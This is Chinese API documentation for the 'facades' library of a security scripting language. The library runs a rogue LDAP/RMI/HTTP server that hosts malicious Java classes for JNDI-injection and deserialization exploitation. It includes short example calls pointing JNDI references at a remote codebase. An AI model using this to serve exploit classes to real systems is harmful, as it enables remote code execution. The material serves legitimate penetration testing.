# facades {#library-facades}

`facades` 库提供一个多协议"恶意服务端"（Facade Server），同时监听 HTTP/RMI/LDAP 等协议，用于 Java 反序列化、JNDI 注入等漏洞的利用与带外验证：把恶意类/资源托管在该服务上，诱导目标回连加载。

典型使用场景：

- 启动服务：`facades.Serve(host, port, configs...)` 直接启动，或 `facades.NewFacadeServer` 创建实例后控制。
- 托管资源：`facades.httpResource` / `facades.evilClassResource` 托管 HTTP/恶意类资源，`facades.rmiResourceAddr` / `facades.ldapResourceAddr` 配置 RMI/LDAP 引用，`facades.javaClassName` / `facades.javaCodeBase` / `facades.javaFactory` / `facades.objectClass` 配置 JNDI 利用参数。

与相邻库的关系：`facades` 是 JNDI/反序列化利用的服务端，常与 `yso`（生成 gadget/恶意类）、`dnslog`（带外检测）、`poc`（发起触发请求）协同完成完整利用链。

> 共 10 个函数

## 函数索引

|函数|参数|返回值|说明|
|:--|:--|:--|:--|
| [facades.evilClassResource](#evilclassresource) | `name string, rmiResourceAddr string` | `FacadeServerConfig` | rmiResourceAddr 注册一个 RMI 资源，引导 RMI 客户端从指定 codebase 加载远程类(RMI/JNDI 注入利用) |
| [facades.httpResource](#httpresource) | `name string, resource []byte` | `FacadeServerConfig` | 在 facade 服务上注册一个 HTTP 资源(路径 /name 返回指定内容)，常用于托管恶意 class 文件 |
| [facades.javaClassName](#javaclassname) | `name string` | `FacadeServerConfig` | 设置 facade 服务 LDAP 响应中的 javaClassName 字段 |
| [facades.javaCodeBase](#javacodebase) | `codeBase string` | `FacadeServerConfig` | 设置 facade 服务 LDAP 响应中的 javaCodeBase 字段(远程类加载地址) |
| [facades.javaFactory](#javafactory) | `factory string` | `FacadeServerConfig` | 设置 facade 服务 LDAP 响应中的 javaFactory 字段(工厂类名) |
| [facades.ldapResourceAddr](#ldapresourceaddr) | `name string, addr string` | `FacadeServerConfig` | 注册一个 LDAP 资源，引导客户端从指定 codebase 加载 Java 工厂类(JNDI 注入利用) |
| [facades.objectClass](#objectclass) | `obj string` | `FacadeServerConfig` | 设置 facade 服务 LDAP 响应中的 objectClass 字段 |
| [facades.rmiResourceAddr](#rmiresourceaddr) | `name string, rmiResourceAddr string` | `FacadeServerConfig` | 注册一个 RMI 资源，引导 RMI 客户端从指定 codebase 加载远程类(RMI/JNDI 注入利用) |

## 可变参数函数索引

|函数|参数|返回值|说明|
|:--|:--|:--|:--|
| [facades.NewFacadeServer](#newfacadeserver) | `host string, port int, configs ...FacadeServerConfig` | `*FacadeServer` | 创建一个 facade 综合服务对象(同时支持 LDAP/RMI/HTTP 等)，可后续调用其方法启动 |
| [facades.Serve](#serve) | `host string, port int, configs ...FacadeServerConfig` | `error` | 在指定地址和端口启动一个 facade 综合服务(同时支持 LDAP/RMI/HTTP 等)并阻塞运行 |

## 函数详情

### evilClassResource {#evilclassresource}

```go
evilClassResource(name string, rmiResourceAddr string) FacadeServerConfig
```

rmiResourceAddr 注册一个 RMI 资源，引导 RMI 客户端从指定 codebase 加载远程类(RMI/JNDI 注入利用)

在 yak 中通过 facades.rmiResourceAddr(或别名 facades.evilClassResource) 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| name | `string` | 资源/类名 |
| rmiResourceAddr | `string` | 远程 codebase 地址 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：配置 RMI 资源指向远程 codebase
server = facades.NewFacadeServer("0.0.0.0", 1099, facades.rmiResourceAddr("Exploit", "http://127.0.0.1:8000/"))
``````````````

---

### httpResource {#httpresource}

```go
httpResource(name string, resource []byte) FacadeServerConfig
```

在 facade 服务上注册一个 HTTP 资源(路径 /name 返回指定内容)，常用于托管恶意 class 文件

在 yak 中通过 facades.httpResource 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| name | `string` | 资源路径名(实际访问路径为 /name) |
| resource | `[]byte` | 资源内容字节数组 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：托管一个 HTTP 资源
server = facades.NewFacadeServer("0.0.0.0", 8000, facades.httpResource("Exploit.class", []byte("...")))
``````````````

---

### javaClassName {#javaclassname}

```go
javaClassName(name string) FacadeServerConfig
```

设置 facade 服务 LDAP 响应中的 javaClassName 字段

在 yak 中通过 facades.javaClassName 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| name | `string` | Java 类名 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：设置恶意 Java 类名
server = facades.NewFacadeServer("0.0.0.0", 8085, facades.javaClassName("EvilObject"))
``````````````

---

### javaCodeBase {#javacodebase}

```go
javaCodeBase(codeBase string) FacadeServerConfig
```

设置 facade 服务 LDAP 响应中的 javaCodeBase 字段(远程类加载地址)

在 yak 中通过 facades.javaCodeBase 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| codeBase | `string` | 远程 codebase 地址 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：设置远程类加载地址
server = facades.NewFacadeServer("0.0.0.0", 1389, facades.javaCodeBase("http://127.0.0.1:8000/"))
``````````````

---

### javaFactory {#javafactory}

```go
javaFactory(factory string) FacadeServerConfig
```

设置 facade 服务 LDAP 响应中的 javaFactory 字段(工厂类名)

在 yak 中通过 facades.javaFactory 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| factory | `string` | 工厂类名 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：设置 javaFactory
server = facades.NewFacadeServer("0.0.0.0", 1389, facades.javaFactory("EvilFactory"))
``````````````

---

### ldapResourceAddr {#ldapresourceaddr}

```go
ldapResourceAddr(name string, addr string) FacadeServerConfig
```

注册一个 LDAP 资源，引导客户端从指定 codebase 加载 Java 工厂类(JNDI 注入利用)

在 yak 中通过 facades.ldapResourceAddr 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| name | `string` | 资源/类名 |
| addr | `string` | 远程 codebase 地址 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：配置 LDAP 资源指向远程 codebase
server = facades.NewFacadeServer("0.0.0.0", 1389, facades.ldapResourceAddr("Exploit", "http://127.0.0.1:8000/"))
``````````````

---

### objectClass {#objectclass}

```go
objectClass(obj string) FacadeServerConfig
```

设置 facade 服务 LDAP 响应中的 objectClass 字段

在 yak 中通过 facades.objectClass 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| obj | `string` | objectClass 值，如 javaNamingReference |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：设置 objectClass
server = facades.NewFacadeServer("0.0.0.0", 1389, facades.objectClass("javaNamingReference"))
``````````````

---

### rmiResourceAddr {#rmiresourceaddr}

```go
rmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig
```

注册一个 RMI 资源，引导 RMI 客户端从指定 codebase 加载远程类(RMI/JNDI 注入利用)

在 yak 中通过 facades.rmiResourceAddr(或别名 facades.evilClassResource) 调用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| name | `string` | 资源/类名 |
| rmiResourceAddr | `string` | 远程 codebase 地址 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `FacadeServerConfig` | 一个 facade 服务配置选项 |

**示例**

``````````````yak
// 该示例为示意性用法：配置 RMI 资源指向远程 codebase
server = facades.NewFacadeServer("0.0.0.0", 1099, facades.rmiResourceAddr("Exploit", "http://127.0.0.1:8000/"))
``````````````

---

## 可变参数函数详情

### NewFacadeServer {#newfacadeserver}

```go
NewFacadeServer(host string, port int, configs ...FacadeServerConfig) *FacadeServer
```

创建一个 facade 综合服务对象(同时支持 LDAP/RMI/HTTP 等)，可后续调用其方法启动

在 yak 中通过 facades.NewFacadeServer 调用

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 监听地址 |
| port | `int` | 监听端口 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| configs | `...FacadeServerConfig` | 可选配置项，如 facades.ldapResourceAddr、facades.httpResource 等 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*FacadeServer` | facade 服务对象 |

**示例**

``````````````yak
// 该示例为示意性用法：创建 facade 服务对象
server = facades.NewFacadeServer("0.0.0.0", 1389, facades.javaClassName("EvilObject"))
println(server != nil)
``````````````

---

### Serve {#serve}

```go
Serve(host string, port int, configs ...FacadeServerConfig) error
```

在指定地址和端口启动一个 facade 综合服务(同时支持 LDAP/RMI/HTTP 等)并阻塞运行

在 yak 中通过 facades.Serve 调用，常用于 JNDI 注入等漏洞的回连利用

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| host | `string` | 监听地址 |
| port | `int` | 监听端口 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| configs | `...FacadeServerConfig` | 可选配置项，如 facades.ldapResourceAddr、facades.httpResource 等 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `error` | 错误信息，启动失败时非 nil |

**示例**

``````````````yak
// 该示例为示意性用法：启动 facade 服务(会阻塞)
err = facades.Serve("0.0.0.0", 1389, facades.ldapResourceAddr("Exploit", "http://127.0.0.1:8000/"))
``````````````

---

